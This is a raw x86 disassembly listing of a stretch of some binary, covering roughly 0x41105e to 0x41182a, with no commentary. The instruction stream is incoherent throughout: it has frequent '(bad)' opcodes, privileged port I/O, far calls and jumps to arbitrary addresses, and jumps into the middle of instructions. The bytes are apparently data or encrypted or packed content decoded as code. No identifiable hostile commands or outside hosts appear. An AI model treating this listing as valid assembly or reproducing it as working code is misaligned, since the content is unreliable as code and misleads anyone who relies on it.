  41105e:	adc    BYTE PTR [edi],ch
  411060:	je     0x4110c3
  411062:	xchg   edx,eax
  411063:	mov    esi,0xbc17748a
  411068:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411069:	sub    DWORD PTR [esi],0xaf16050c
  41106f:	mov    BYTE PTR [edx-0x35],bl
  411072:	pop    ebx
  411073:	cmp    BYTE PTR [eax-0x42],bh
  411076:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411077:	shl    ah,cl
  411079:	dec    esi
  41107a:	pop    edx
  41107b:	push   ds
  41107c:	dec    esp
  41107d:	data16 mov al,0x8e
  411080:	stc    
  411081:	ror    DWORD PTR [edx],0xc5
  411084:	xchg   ebx,eax
  411085:	add    al,0xbb
  411087:	stos   BYTE PTR es:[edi],al
  411088:	out    dx,eax
  411089:	adc    al,0x0
  41108b:	pusha  
  41108c:	aam    0x35
  41108e:	ins    BYTE PTR es:[edi],dx
  41108f:	sub    eax,0x4d04109e
  411094:	add    al,0xbf
  411096:	scas   eax,DWORD PTR es:[edi]
  411097:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411098:	mov    ecx,0x42722e61
  41109d:	(bad)  
  41109e:	scas   al,BYTE PTR es:[edi]
  41109f:	sbb    ebp,DWORD PTR [edi-0x74]
  4110a2:	loope  0x411091
  4110a4:	jo     0x41102a
  4110a6:	adc    ecx,DWORD PTR [edi+0x61]
  4110a9:	out    dx,eax
  4110aa:	loope  0x4110ae
  4110ac:	fsubr  DWORD PTR [ecx+ebp*2-0x6a212077]
  4110b3:	mov    ds:0xdaad188a,al
  4110b8:	aad    0x2c
  4110ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110bb:	add    esi,esi
  4110bd:	pop    edi
  4110be:	ret    0xfe7c
  4110c1:	jg     0x411094
  4110c3:	and    DWORD PTR [eax],ecx
  4110c5:	xchg   DWORD PTR [eax+ebp*2+0x55],edi
  4110c9:	dec    ebx
  4110ca:	test   al,0x3f
  4110cc:	test   DWORD PTR [ebx],edx
  4110ce:	xor    dl,bl
  4110d0:	sub    esp,DWORD PTR [edx-0x1c92d2ee]
  4110d6:	std    
  4110d7:	int3   
  4110d8:	add    eax,0x171510dd
  4110dd:	add    al,BYTE PTR [ebx+0x21c3c6ae]
  4110e3:	js     0x4110da
  4110e5:	pop    esp
  4110e6:	jae    0x411094
  4110e8:	retf   0x1436
  4110eb:	xor    bh,BYTE PTR [edi-0x14a09276]
  4110f1:	mov    ecx,0x6565077f
  4110f6:	fadd   st,st(2)
  4110f8:	push   eax
  4110f9:	add    eax,0x930e4903
  4110fe:	jle    0x4110e6
  411100:	out    0xfa,al
  411102:	adc    edx,DWORD PTR [ebp-0x3a]
  411105:	aad    0x41
  411107:	mov    ecx,0x6304614d
  41110c:	nop
  41110d:	push   esi
  41110e:	mov    dl,0xde
  411110:	fdiv   st(4),st
  411112:	fbstp  TBYTE PTR [esi-0x33275487]
  411118:	push   fs
  41111a:	inc    esi
  41111b:	paddsw mm4,mm5
  41111e:	cmp    ebx,esi
  411120:	retf   0xa11
  411123:	cmp    dh,bh
  411125:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411126:	jecxz  0x411198
  411128:	mov    ch,0xf6
  41112a:	dec    eax
  41112b:	add    eax,0xd5c0a956
  411130:	loope  0x4110c0
  411132:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411133:	out    dx,eax
  411134:	in     eax,dx
  411135:	xor    al,0xae
  411137:	and    DWORD PTR [edi],esp
  411139:	ret    
  41113a:	jmp    0x7500b81e
  41113f:	pop    edi
  411140:	cmp    al,0xf6
  411142:	(bad)  
  411144:	(bad)
  411147:	mov    ds:0x72a1fc3b,al
  41114c:	lods   eax,DWORD PTR ds:[esi]
  41114d:	or     BYTE PTR [ecx],ch
  41114f:	jle    0x411145
  411151:	push   eax
  411152:	and    ebx,DWORD PTR ds:[eax]
  411155:	gs (bad) 
  411157:	ds jle 0x4111cd
  41115a:	mul    DWORD PTR [eax]
  41115c:	shr    DWORD PTR [ecx+ebp*2+0x60ca24a],1
  411163:	out    dx,al
  411164:	in     al,dx
  411165:	icebp  
  411166:	pop    esi
  411167:	adc    ch,dl
  411169:	mov    ch,0xc2
  41116b:	sbb    bh,ch
  41116d:	int    0x42
  41116f:	stos   DWORD PTR es:[edi],eax
  411170:	aas    
  411171:	push   ebx
  411172:	push   ss
  411173:	ins    BYTE PTR es:[edi],dx
  411174:	call   0x7acae3c0
  411179:	imul   esp,DWORD PTR [eax+eiz*8-0x3d],0x75b35e3f
  411181:	mov    ah,0x62
  411183:	rcr    dl,cl
  411185:	jmp    0x8bfaedc3
  41118a:	jge    0x4111ae
  41118c:	cmp    dl,bl
  41118e:	push   esi
  41118f:	daa    
  411190:	cmp    BYTE PTR [ecx],ah
  411192:	out    0x81,eax
  411194:	aam    0x28
  411196:	push   esp
  411197:	add    BYTE PTR [eax],bh
  411199:	les    edx,FWORD PTR [edi]
  41119b:	stc    
  41119c:	mov    bl,0xa3
  41119e:	cli    
  41119f:	sub    eax,0x1e3debc5
  4111a4:	inc    eax
  4111a5:	loopne 0x4111dd
  4111a7:	jle    0x4111f8
  4111a9:	ins    DWORD PTR es:[edi],dx
  4111aa:	xor    esi,esp
  4111ac:	add    eax,0xc1a46e20
  4111b1:	int    0x2c
  4111b3:	sbb    dh,BYTE PTR [edi+edx*2-0x5]
  4111b7:	out    dx,al
  4111b8:	rcl    al,cl
  4111ba:	test   DWORD PTR [edx-0x30],esp
  4111bd:	sbb    al,0xce
  4111bf:	pusha  
  4111c0:	jno    0x4111e1
  4111c2:	rol    bh,cl
  4111c4:	int    0x5
  4111c6:	nop
  4111c7:	cwde   
  4111c8:	dec    ebx
  4111c9:	ret    
  4111ca:	pop    edx
  4111cb:	call   0xac04:0xe74c3878
  4111d2:	add    ch,BYTE PTR [ebx-0x2e]
  4111d5:	cld    
  4111d6:	mov    al,ds:0x6f1433b8
  4111db:	dec    ebx
  4111dc:	test   al,0xa4
  4111de:	dec    ebp
  4111df:	mov    dl,0xf
  4111e1:	mov    dh,0x91
  4111e3:	or     BYTE PTR [ebp+0x5e24afd4],cl
  4111e9:	aas    
  4111ea:	dec    ebx
  4111eb:	push   ds
  4111ec:	sti    
  4111ed:	add    BYTE PTR [edi+0x27],dl
  4111f0:	dec    eax
  4111f1:	pop    ebp
  4111f2:	mov    BYTE PTR [ecx-0x3842c0ec],dl
  4111f8:	mov    esi,0x688e5074
  4111fd:	push   eax
  4111fe:	scas   al,BYTE PTR es:[edi]
  4111ff:	ficomp DWORD PTR [edi+0x35dabc9e]
  411205:	pop    ebp
  411206:	inc    edx
  411207:	clc    
  411208:	test   al,0xbb
  41120a:	call   0xb86:0x4749ff9b
  411211:	adc    al,0x5a
  411213:	std    
  411214:	pop    ss
  411215:	add    esp,ecx
  411217:	cwde   
  411218:	pop    ds
  411219:	scas   al,BYTE PTR es:[edi]
  41121a:	mov    ds:0x1d452ca2,eax
  41121f:	add    eax,0x91ad8cae
  411224:	les    ecx,FWORD PTR [eax-0x682ec84d]
  41122a:	pop    esp
  41122b:	inc    esp
  41122c:	test   al,0x19
  41122e:	test   al,0x55
  411230:	out    0x1b,eax
  411232:	ins    DWORD PTR es:[edi],dx
  411233:	dec    edi
  411234:	mov    al,ds:0x1e20b45d
  411239:	mov    BYTE PTR [edx-0x44],al
  41123c:	gs stos DWORD PTR es:[edi],eax
  41123e:	fbstp  TBYTE PTR [esi+0x56]
  411241:	xlat   BYTE PTR ds:[ebx]
  411242:	or     dh,ah
  411244:	sbb    edi,ebx
  411246:	mov    ch,BYTE PTR [ecx+ebx*2+0x20]
  41124a:	xchg   ecx,eax
  41124b:	data16 sbb bl,dh
  41124e:	add    esp,DWORD PTR [ebx]
  411250:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411251:	and    al,0x3a
  411253:	pop    esp
  411254:	sub    ecx,DWORD PTR [edi-0x5c]
  411257:	push   eax
  411258:	mov    ah,0xf
  41125a:	cmp    BYTE PTR [eax-0x2c],ch
  41125d:	iret   
  41125e:	or     BYTE PTR [ebp+0x68],cl
  411261:	rcr    BYTE PTR [edi+0x8],cl
  411264:	int3   
  411265:	pusha  
  411266:	ja     0x41120f
  411268:	inc    edi
  411269:	inc    ebx
  41126a:	xchg   DWORD PTR [eax],esp
  41126c:	pop    edi
  41126d:	ret    
  41126e:	cmp    al,0x67
  411270:	mov    ebp,0x91786f03
  411275:	push   esp
  411276:	inc    ebx
  411277:	mov    edx,DWORD PTR [ebx]
  411279:	cli    
  41127a:	cmp    eax,0xad21b9ba
  41127f:	imul   esi,edx,0xb9fbc944
  411285:	test   al,0x29
  411287:	sti    
  411288:	and    BYTE PTR [eax],ch
  41128a:	(bad)  
  41128b:	mov    ebx,0x8e652cf1
  411290:	lods   al,BYTE PTR ds:[esi]
  411291:	push   0xe1d59123
  411296:	rol    BYTE PTR [eax],1
  411298:	mov    edx,DWORD PTR [eax]
  41129a:	bound  edx,QWORD PTR [ecx]
  41129c:	in     al,0x79
  41129e:	js     0x41130d
  4112a0:	pop    esi
  4112a1:	cmc    
  4112a2:	fild   QWORD PTR [eax]
  4112a4:	(bad)  
  4112a6:	pop    ecx
  4112a7:	xor    BYTE PTR [eax-0x14c81716],al
  4112ad:	dec    eax
  4112ae:	cs xchg edx,eax
  4112b0:	add    eax,0x4c034a04
  4112b5:	or     BYTE PTR [esi+0x17],dh
  4112b8:	sbb    eax,0x512544c5
  4112bd:	lock ficomp DWORD PTR [eax]
  4112c0:	lods   eax,DWORD PTR ds:[esi]
  4112c1:	sub    DWORD PTR [ebp-0x3f],0x457c9ac1
  4112c8:	mov    eax,0xfa4d3ead
  4112cd:	sub    ch,BYTE PTR [eax]
  4112cf:	cs imul ebp,ebx,0x7a
  4112d3:	aas    
  4112d4:	push   ebx
  4112d5:	cmp    eax,0xf3842833
  4112da:	adc    BYTE PTR [ecx-0x2a5f63cb],ch
  4112e0:	stos   DWORD PTR es:[edi],eax
  4112e1:	xor    BYTE PTR [ebp-0x6a],ch
  4112e4:	and    eax,0xa5942818
  4112e9:	or     BYTE PTR [edi-0x7e],0x14
  4112ed:	mov    ch,0x33
  4112ef:	adc    ebp,esi
  4112f1:	and    al,0x0
  4112f3:	pop    esp
  4112f4:	test   DWORD PTR ds:[edi+ebp*1],ecx
  4112f8:	cld    
  4112f9:	add    dh,0xa8
  4112fc:	adc    al,0x19
  4112fe:	out    0x49,al
  411300:	clc    
  411301:	ficomp WORD PTR [ecx]
  411303:	shr    bl,0x69
  411306:	cmc    
  411307:	repnz xor al,0xd6
  41130a:	repz push es
  41130c:	dec    esp
  41130d:	sbb    edx,DWORD PTR [ecx-0x57]
  411310:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411311:	inc    edx
  411312:	adc    BYTE PTR [edi-0x46],bh
  411315:	jmp    0x65624fb9
  41131a:	mov    bl,0xe0
  41131c:	mov    WORD PTR ds:0x38284fb8,ds
  411322:	mov    al,ds:0x3fafd0d1
  411327:	aam    0xc0
  411329:	ja     0x41133b
  41132b:	push   esp
  41132c:	ficom  DWORD PTR [eax+0xa524648]
  411332:	lds    edi,FWORD PTR ds:0xf724d31e
  411338:	xor    DWORD PTR ds:0x83569d38,0x33436e3b
  411342:	mov    eax,0x757aae36
  411347:	imul   ebp,DWORD PTR [ecx+0x7c956835],0xcca4ad5a
  411351:	xor    eax,ebp
  411353:	clc    
  411354:	add    ch,BYTE PTR [esi-0x108b069c]
  41135a:	xchg   esp,eax
  41135b:	cdq    
  41135c:	call   0xe0d0:0x95f53a7a
  411363:	repnz or dl,bl
  411366:	cs sub ebp,eax
  411369:	cli    
  41136a:	sbb    BYTE PTR [edi+edi*1+0x4095dd9f],al
  411371:	enter  0x8652,0xcd
  411375:	stos   DWORD PTR es:[edi],eax
  411376:	lea    ebp,[ebx-0x744c887d]
  41137c:	pop    eax
  41137d:	sbb    BYTE PTR [ebx-0x456ceaaa],ah
  411383:	nop
  411384:	inc    ebx
  411385:	sbb    BYTE PTR [edx-0x3f],ah
  411388:	repnz repz cld 
  41138b:	xchg   edx,eax
  41138c:	aaa    
  41138d:	mov    ah,0x3b
  41138f:	xchg   ebp,eax
  411390:	ins    DWORD PTR es:[edi],dx
  411391:	or     eax,0x48e9d8cf
  411396:	stc    
  411397:	xchg   ebp,eax
  411398:	dec    ebp
  411399:	and    DWORD PTR [ecx+0x44],edi
  41139c:	mov    bh,0x1d
  41139e:	into   
  41139f:	stc    
  4113a0:	mov    ebp,0x5739ba9f
  4113a5:	retf   0x3ace
  4113a8:	sbb    ah,al
  4113aa:	pop    ds
  4113ab:	and    ecx,DWORD PTR [edx-0x76835b42]
  4113b1:	test   eax,0x7b3d6476
  4113b6:	mov    bl,0xb2
  4113b8:	loopne 0x411343
  4113ba:	mov    eax,0x143f6992
  4113bf:	mov    bh,0x89
  4113c1:	xchg   esi,eax
  4113c2:	pop    esp
  4113c3:	out    dx,al
  4113c4:	cli    
  4113c5:	ds cli 
  4113c7:	stos   DWORD PTR es:[edi],eax
  4113c8:	pop    edx
  4113c9:	mov    ds:0x7133dac9,eax
  4113ce:	in     eax,dx
  4113cf:	rcl    bh,cl
  4113d1:	mov    ds:0x38b24937,eax
  4113d6:	fstp   st(3)
  4113d8:	xchg   edx,eax
  4113d9:	bound  ebx,QWORD PTR [edx]
  4113db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113dc:	sub    al,ah
  4113de:	inc    ebx
  4113df:	je     0x41144b
  4113e1:	inc    esp
  4113e2:	pop    es
  4113e3:	std    
  4113e4:	scas   al,BYTE PTR es:[edi]
  4113e5:	or     ah,bl
  4113e7:	ja     0x4113f8
  4113e9:	dec    ebp
  4113ea:	inc    eax
  4113eb:	aas    
  4113ec:	lds    esp,FWORD PTR [ebx]
  4113ee:	loopne 0x41142c
  4113f0:	rol    DWORD PTR [ebp-0x4e],0x25
  4113f4:	(bad)  
  4113f5:	aaa    
  4113f6:	xor    eax,0x30aadedc
  4113fb:	out    0xf6,al
  4113fd:	mov    ah,0x2f
  4113ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411400:	sbb    BYTE PTR [edx+0x23],al
  411403:	and    DWORD PTR [edi-0x554095c4],esp
  411409:	pusha  
  41140a:	cld    
  41140b:	je     0x41146b
  41140d:	in     al,0x84
  41140f:	adc    al,0x8d
  411411:	and    ebx,DWORD PTR [ebx+ecx*2-0x7e910932]
  411418:	stos   BYTE PTR es:[edi],al
  411419:	cmp    esi,eax
  41141b:	cmp    al,0xa9
  41141d:	js     0x41142c
  41141f:	cdq    
  411420:	add    eax,0xaf81b2f4
  411425:	and    esi,edx
  411427:	mov    esi,0x9fcdb2c6
  41142c:	into   
  41142d:	pop    ebp
  41142e:	in     al,dx
  41142f:	es jle 0x41148d
  411432:	shl    BYTE PTR [esp+eax*8-0x2ded6518],1
  411439:	loopne 0x4113cc
  41143b:	loop   0x41143a
  41143d:	stos   DWORD PTR es:[edi],eax
  41143e:	ins    BYTE PTR es:[edi],dx
  41143f:	xchg   esp,eax
  411440:	mov    bl,BYTE PTR [ecx+0x36e03f4f]
  411446:	mov    dl,0xeb
  411448:	mov    edx,0x3645ac2
  41144d:	ret    0x38b1
  411450:	mov    ah,0xe0
  411452:	mul    BYTE PTR [edi-0x451b6766]
  411458:	jne    0x41147d
  41145a:	es int 0xbe
  41145d:	lods   al,BYTE PTR ss:[esi]
  41145f:	pop    esp
  411460:	in     eax,dx
  411461:	scas   eax,DWORD PTR es:[edi]
  411462:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411463:	xchg   ebp,eax
  411464:	rol    BYTE PTR [edx-0x12],cl
  411467:	jg     0x41142c
  411469:	cs cli 
  41146b:	loop   0x4114ab
  41146d:	mov    al,ds:0xdfb52192
  411472:	test   DWORD PTR [edx-0x4e061559],eax
  411478:	sbb    eax,0x8241f40
  41147d:	mov    esp,0x930ae093
  411482:	inc    edx
  411483:	icebp  
  411484:	scas   al,BYTE PTR es:[edi]
  411485:	ins    DWORD PTR es:[edi],dx
  411486:	pop    edi
  411487:	fucomi st,st(1)
  411489:	mov    esp,0xa281f60
  41148e:	ins    BYTE PTR es:[edi],dx
  41148f:	sbb    BYTE PTR [edx+0x35],0xdd
  411493:	xor    edi,DWORD PTR [edx]
  411495:	mov    edi,0x32c91e0e
  41149a:	shl    edx,cl
  41149c:	ss jle 0x4114fe
  41149f:	cmp    al,0x5b
  4114a1:	(bad)  
  4114a2:	outs   dx,BYTE PTR gs:[esi]
  4114a4:	adc    DWORD PTR [esi+edi*1],esp
  4114a7:	sbb    al,0x7d
  4114a9:	mov    WORD PTR [esi],es
  4114ab:	jge    0x41143a
  4114ad:	addr16 sti 
  4114af:	pushf  
  4114b0:	mov    ah,0x7b
  4114b2:	or     cl,BYTE PTR [esi-0x1f]
  4114b5:	iret   
  4114b6:	(bad)  
  4114b7:	jle    0x41148c
  4114b9:	and    eax,0xc610f3c5
  4114be:	pop    ebx
  4114bf:	test   al,0xb2
  4114c1:	popf   
  4114c2:	pcmpeqw mm6,QWORD PTR [edi]
  4114c5:	mov    edi,0xe870ec6
  4114ca:	lock mov dl,0x1c
  4114cd:	cmp    ecx,eax
  4114cf:	into   
  4114d0:	scas   eax,DWORD PTR es:[edi]
  4114d1:	mov    ebx,0x47c6eb01
  4114d6:	ret    
  4114d7:	cwde   
  4114d8:	mov    esi,0x31c2e45e
  4114dd:	cwde   
  4114de:	mov    dh,0x6f
  4114e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114e1:	repnz sar BYTE PTR [eax],1
  4114e4:	stos   BYTE PTR es:[edi],al
  4114e5:	jle    0x411508
  4114e7:	fmul   QWORD PTR [ebx+0x3d]
  4114ea:	mov    ds:0x98a240fa,al
  4114ef:	out    0x74,al
  4114f1:	push   ecx
  4114f2:	out    dx,eax
  4114f3:	jnp    0x4114a7
  4114f5:	adc    eax,0xa93da6f0
  4114fa:	out    0xbe,al
  4114fc:	push   ebp
  4114fd:	sub    esp,edi
  4114ff:	clc    
  411500:	loope  0x4114c8
  411502:	jmp    0x46bdd78e
  411507:	out    dx,eax
  411508:	outs   dx,DWORD PTR ds:[esi]
  411509:	sbb    esi,DWORD PTR [edi]
  41150b:	nop
  41150c:	dec    esi
  41150d:	aaa    
  41150e:	xor    DWORD PTR [ecx-0x3920c9c7],ebx
  411514:	mov    edi,0xd94e3b6f
  411519:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41151a:	and    esp,esi
  41151c:	jle    0x41151c
  41151e:	sbb    DWORD PTR [edi+edi*4+0x16ef5679],edi
  411525:	push   ds
  411526:	fstp   TBYTE PTR [ecx]
  411528:	loopne 0x41151b
  41152a:	sti    
  41152b:	aam    0x27
  41152d:	je     0x4114d4
  41152f:	out    dx,eax
  411530:	xor    esp,esi
  411532:	ss pop edx
  411534:	jmp    0x4b5f4073
  411539:	rcr    DWORD PTR [edi+0x5269797d],cl
  41153f:	and    BYTE PTR [edx-0x2d],bh
  411542:	imul   ebx,DWORD PTR [esi+eax*1+0x6f],0xf3ef2acc
  41154a:	aaa    
  41154b:	jae    0x4115a4
  41154d:	pushf  
  41154e:	fwait
  41154f:	(bad)  
  411550:	pop    eax
  411551:	jns    0x4115b4
  411553:	cmp    eax,0xbeaa6c45
  411558:	mov    WORD PTR [ebp-0xa5fe87b],ds
  41155e:	sbb    al,0xd2
  411560:	mov    ah,0xdf
  411562:	xchg   ebx,eax
  411563:	jb     0x411509
  411565:	push   ds
  411566:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411567:	pusha  
  411568:	and    DWORD PTR [esi+0x5d141d17],ebx
  41156e:	into   
  41156f:	cs pop esi
  411571:	or     esp,DWORD PTR [ecx]
  411573:	std    
  411574:	idiv   DWORD PTR [esi-0x71]
  411577:	loope  0x41152e
  411579:	outs   dx,BYTE PTR ds:[esi]
  41157a:	imul   ecx,DWORD PTR [esi+eiz*1-0x653bc2ec],0x3f765ce3
  411585:	pusha  
  411586:	xchg   ebp,eax
  411587:	mov    DWORD PTR [eax+0x71],esi
  41158a:	outs   dx,BYTE PTR ds:[esi]
  41158b:	mov    BYTE PTR [esi-0x4b330a3],cl
  411591:	pop    ss
  411592:	(bad)  [edi+0x71effea9]
  411598:	clc    
  411599:	daa    
  41159a:	push   ecx
  41159b:	mov    al,0x23
  41159d:	push   es
  41159e:	out    0x1d,al
  4115a0:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4115a2:	inc    eax
  4115a3:	or     edx,DWORD PTR [ecx+0x67]
  4115a6:	aam    0x13
  4115a8:	xchg   DWORD PTR [edi+0x1d55b2ba],eax
  4115ae:	cmp    BYTE PTR [edx+0x5deb90f],bh
  4115b4:	fcom   QWORD PTR [ebx+0x26]
  4115b7:	xchg   BYTE PTR [edi-0x73],ah
  4115ba:	scas   eax,DWORD PTR es:[edi]
  4115bb:	js     0x4115cd
  4115bd:	jne    0x411600
  4115bf:	das    
  4115c0:	retf   0xa249
  4115c3:	mov    BYTE PTR [edi+0x79],dh
  4115c6:	mov    ecx,gs
  4115c8:	add    eax,0x25f081d
  4115cd:	lahf   
  4115ce:	push   edi
  4115cf:	pop    ds
  4115d0:	dec    edx
  4115d1:	nop
  4115d2:	mov    ebx,0x13776a2c
  4115d7:	es (bad) 
  4115d9:	or     eax,0x9a35e31
  4115de:	add    al,0x57
  4115e0:	dec    eax
  4115e1:	push   ss
  4115e2:	(bad)  
  4115e3:	int    0xe9
  4115e5:	jmp    0x637b:0x9052448d
  4115ec:	mov    dl,0x36
  4115ee:	add    ecx,esp
  4115f0:	mov    eax,gs:0x6aa48a24
  4115f6:	stos   DWORD PTR es:[edi],eax
  4115f7:	jecxz  0x41158a
  4115f9:	cmp    eax,0x7d3b75b3
  4115fe:	dec    ebp
  4115ff:	xor    edx,DWORD PTR [ebx-0x1b]
  411602:	popf   
  411603:	es push esi
  411605:	push   ss
  411606:	mov    edi,0x7be6abc0
  41160b:	pop    edi
  41160c:	loope  0x411604
  41160e:	outs   dx,DWORD PTR ds:[esi]
  41160f:	xchg   ecx,eax
  411610:	mov    edi,0x1df03b32
  411615:	stc    
  411616:	xchg   ebp,eax
  411617:	sbb    eax,0xe2e0860
  41161c:	cmp    eax,0xe9ac3fd9
  411621:	out    dx,al
  411622:	or     BYTE PTR [ebx+0x43fa1bae],al
  411628:	shl    BYTE PTR [edi-0x5c],0x4c
  41162c:	and    BYTE PTR ds:[bx+si+0x1d94],bh
  411632:	sbb    DWORD PTR [ecx-0x1db8c275],0xb0ca1a47
  41163c:	sub    eax,0x30ac397
  411641:	inc    ebx
  411642:	jmp    0xaeb1e3bf
  411647:	push   eax
  411648:	fwait
  411649:	dec    ebp
  41164a:	cli    
  41164b:	or     BYTE PTR [edx],dh
  41164d:	leave  
  41164e:	stos   BYTE PTR es:[edi],al
  41164f:	mov    esp,0x18ffa5e
  411654:	fmul   DWORD PTR [esi+0x28]
  411657:	das    
  411658:	push   ss
  411659:	scas   al,BYTE PTR es:[edi]
  41165a:	call   0x147c:0xad4625d
  411661:	iret   
  411662:	and    ebp,DWORD PTR [edx-0x1d]
  411665:	shr    ecx,cl
  411667:	xor    al,0xca
  411669:	js     0x411696
  41166b:	sub    BYTE PTR [ecx+0x273ba32e],bh
  411671:	das    
  411672:	ret    
  411673:	(bad)  
  411674:	cli    
  411675:	jge    0x41160c
  411677:	adc    DWORD PTR [ebx+ebp*8-0x2e],edx
  41167b:	xchg   edx,eax
  41167c:	(bad)  
  41167d:	gs jp  0x4116b0
  411680:	rcr    DWORD PTR [eax+0x46a889e8],1
  411686:	add    eax,0xff971c15
  41168b:	add    eax,0xfc17f41c
  411690:	nop
  411691:	sbb    ecx,DWORD PTR ss:[ecx+eax*2+0x277ed1a4]
  411699:	xchg   ebx,eax
  41169a:	and    eax,0xfcfbcb20
  41169f:	(bad)  
  4116a0:	adc    al,0x7c
  4116a2:	(bad)  
  4116a3:	iret   
  4116a4:	loop   0x411640
  4116a6:	cld    
  4116a7:	sbb    eax,DWORD PTR [ecx]
  4116a9:	mov    DWORD PTR fs:[edi-0x6],edi
  4116ad:	sar    DWORD PTR [eax-0x517289cc],1
  4116b3:	sub    DWORD PTR [esi-0x4313ff34],esi
  4116b9:	(bad)  
  4116ba:	jo     0x4116f5
  4116bc:	int    0x48
  4116be:	adc    al,0x4b
  4116c0:	retf   
  4116c1:	or     esp,edx
  4116c3:	and    DWORD PTR [ecx+eiz*8],edx
  4116c6:	jne    0x4116bd
  4116c8:	push   ds
  4116c9:	jl     0x4116ae
  4116cb:	mov    dl,0xcf
  4116cd:	mov    eax,0x40557a79
  4116d2:	sbb    BYTE PTR [edx-0x23],bh
  4116d5:	dec    eax
  4116d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116d7:	fisttp DWORD PTR [edi+0x18e29caf]
  4116dd:	inc    ebp
  4116de:	(bad)  
  4116df:	sbb    dh,BYTE PTR [ebx-0x5]
  4116e2:	jbe    0x411738
  4116e4:	mov    ch,0x14
  4116e6:	out    0x49,eax
  4116e8:	fidivr DWORD PTR [edi-0x2b]
  4116eb:	cmp    al,0x3e
  4116ed:	push   0xfffffff6
  4116ef:	pop    esp
  4116f0:	popf   
  4116f1:	xor    BYTE PTR [esi-0x60d8370e],cl
  4116f7:	mov    fs:0xd087cce8,eax
  4116fd:	cmc    
  4116fe:	xor    ebp,DWORD PTR [edi-0x72]
  411701:	pop    ds
  411702:	inc    edx
  411703:	ror    DWORD PTR [edi+0x1e],0x4d
  411707:	jg     0x4116e6
  411709:	rcr    edi,1
  41170b:	call   0x289e:0x896b0b4c
  411712:	adc    ebp,DWORD PTR [esi-0x11]
  411715:	push   ebx
  411716:	dec    ebx
  411717:	jle    0x411752
  411719:	repz pop ebp
  41171b:	or     BYTE PTR [edx-0x74],dh
  41171e:	mov    eax,ds:0xa427b626
  411723:	mov    al,0xe7
  411725:	repnz mov WORD PTR [esi-0x308682d0],gs
  41172c:	mov    cl,0x61
  41172e:	mov    al,0xf0
  411730:	cli    
  411731:	pop    ss
  411732:	inc    edi
  411733:	shl    BYTE PTR [esi],cl
  411735:	leave  
  411736:	mov    bh,0xfa
  411738:	mov    ds:0x3ad78228,al
  41173d:	shr    BYTE PTR [ebp+0x7d],cl
  411740:	push   es
  411741:	icebp  
  411742:	and    dh,cl
  411744:	jae    0x4117b5
  411746:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411747:	sar    BYTE PTR [ebx-0x2e],0x5f
  41174b:	int    0x78
  41174d:	jle    0x411782
  41174f:	add    al,dh
  411751:	push   edi
  411752:	addr16 or eax,0xeaf1ab7a
  411758:	cmp    ebx,DWORD PTR [eax+0x1e]
  41175b:	test   BYTE PTR [edi],ah
  41175d:	jle    0x411718
  41175f:	into   
  411760:	pop    edx
  411761:	push   ss
  411762:	sub    eax,0xe960deef
  411767:	sar    BYTE PTR [esi-0x48171f5b],0x33
  41176e:	add    eax,DWORD PTR [edx+0x5e163b6b]
  411774:	lea    esi,[edx-0x6d5f6198]
  41177a:	jno    0x411744
  41177c:	stos   DWORD PTR es:[edi],eax
  41177d:	dec    edx
  41177e:	cdq    
  41177f:	test   BYTE PTR [ebp+0x32],bl
  411782:	idiv   DWORD PTR [edx]
  411784:	mov    BYTE PTR [ebp-0x47],bl
  411787:	push   esp
  411788:	push   0x4d
  41178a:	mov    eax,0x5ed23d7e
  41178f:	out    0x2d,eax
  411791:	test   eax,edi
  411793:	test   ebp,ecx
  411795:	push   esi
  411796:	lea    esp,[ebp+0x38]
  411799:	push   ebp
  41179a:	lods   eax,DWORD PTR ds:[esi]
  41179b:	jecxz  0x4117d7
  41179d:	pop    ebp
  41179e:	pop    esp
  41179f:	fcomip st,st(3)
  4117a1:	mov    ebx,0x2dc92c62
  4117a6:	mov    bl,0x89
  4117a8:	mov    eax,ds:0xae2a6c85
  4117ad:	pop    edx
  4117ae:	js     0x4117c6
  4117b0:	lds    esi,FWORD PTR ds:0x2768aa2e
  4117b6:	je     0x4117f5
  4117b8:	int    0x85
  4117ba:	stos   BYTE PTR es:[edi],al
  4117bb:	lods   eax,DWORD PTR ds:[esi]
  4117bc:	loop   0x411749
  4117be:	push   0x34
  4117c0:	add    DWORD PTR [eax-0x3d615ec5],edx
  4117c6:	mov    eax,ds:0xcdb8899
  4117cb:	mov    al,ds:0x919332fd
  4117d0:	fsubr  QWORD PTR [edx-0x6e]
  4117d3:	and    esi,DWORD PTR [eiz*4+0x449f5539]
  4117da:	dec    ebp
  4117db:	dec    ebx
  4117dc:	and    BYTE PTR [ebp+edx*8+0x23],al
  4117e0:	push   esp
  4117e1:	or     bl,BYTE PTR [esi-0x670948db]
  4117e7:	into   
  4117e8:	pop    esi
  4117e9:	sbb    edx,ebx
  4117eb:	sbb    eax,0x40bdcbd9
  4117f0:	mov    al,ds:0x1a3c9fa1
  4117f5:	pop    eax
  4117f6:	or     ebx,DWORD PTR [edi+esi*8-0x3da5e22]
  4117fd:	sub    dh,BYTE PTR [ebx-0x78183e40]
  411803:	jecxz  0x41183d
  411805:	push   ecx
  411806:	fistp  QWORD PTR [ecx]
  411808:	stc    
  411809:	loope  0x411830
  41180b:	jnp    0x4117f8
  41180d:	cmp    BYTE PTR [eax+0x37],al
  411810:	mov    eax,0x17882b0b
  411815:	dec    edi
  411816:	mov    eax,ds:0x9036564f
  41181b:	clc    
  41181c:	push   ecx
  41181d:	jl     0x41182f
  41181f:	sub    eax,0xc9ae1991
  411824:	stc    
  411825:	mov    ds:0xfaa4ed09,eax
  41182a:	push   esi
